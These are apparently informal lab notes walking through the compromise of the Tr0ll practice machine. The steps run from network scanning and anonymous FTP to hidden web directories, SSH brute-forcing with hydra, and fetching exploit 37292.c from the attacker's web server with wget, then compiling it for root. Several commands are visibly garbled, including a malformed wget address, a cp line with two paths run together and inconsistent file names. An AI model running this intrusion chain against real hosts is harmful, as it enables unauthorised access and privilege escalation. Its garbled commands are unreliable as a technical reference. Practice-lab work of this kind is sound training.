sudo arp-scan -l (scanning all the networks)
nmap -sV -p- -Pn -v 192.168.157.131 (open port scan for the ip address of tr0ll.)
ftp 192.168.157.131 (connecting to the ftp )
username: anonymous

ls
download the file lol.pcap
get lol.pcap
analyze the data in wireshark ( using command )
when analyzing the data . on 40th number we can find the clue.
sup3rs3cr3tdirlol
we open the website from the local host (ip of the kali machine)
in the website we search for
192.168.157.131/sup3rs3cr3tdirlol
This takes us to the directory for the tr0ll machine.
Here we download the file. Rofl.lmao
Cd downloads.
Ls
Chmod +x roflmao
We can open this file.
./ roflmao (to view this file)
We got the address 0X0856BF
We can use this address in our website to search for clues.
After using the address : http://192.168.157.131/0x0856BF/

We find the password and username directory. We collect all the information from both the
folders and then bruteforce using hydra.
Nano user.txt (we can insert the fields inside the user.txt)
Nano pass.txt (we insert the fields inside the passtxt)
Hydra -L user.txt -P pass.txt 192.168.157.131 ssh (bruteforcing using the hydra tool)
Once we login using the hydra tool, we can get the access for few minutes until logged out.
Ssh overflow @192.168.157.131 to access the troll using ssh
Bash
Cd temp
Uname -a (to get the troll version)
Once we get the troll version, we can locate the version using
Locate 37292.c
cp /home/kali/Downloads/37292.c/usr/share/exploitdb/exploits/linux/local/37292.c
/var/www/html/37292.c (copy the path )
service apache2 start (starting the server to download 37292.c)
ifconfig (checking the ip address of our system for website hosting by apache server)
then
again we go into
ssh overflow 192.168.157.131
bash
cd tmp
wget http://192/168.187.131/37292.c downloading the file
ls
gcc 37292.c
./a.out (getting root priviliges)
Whoami

Disabling the cron
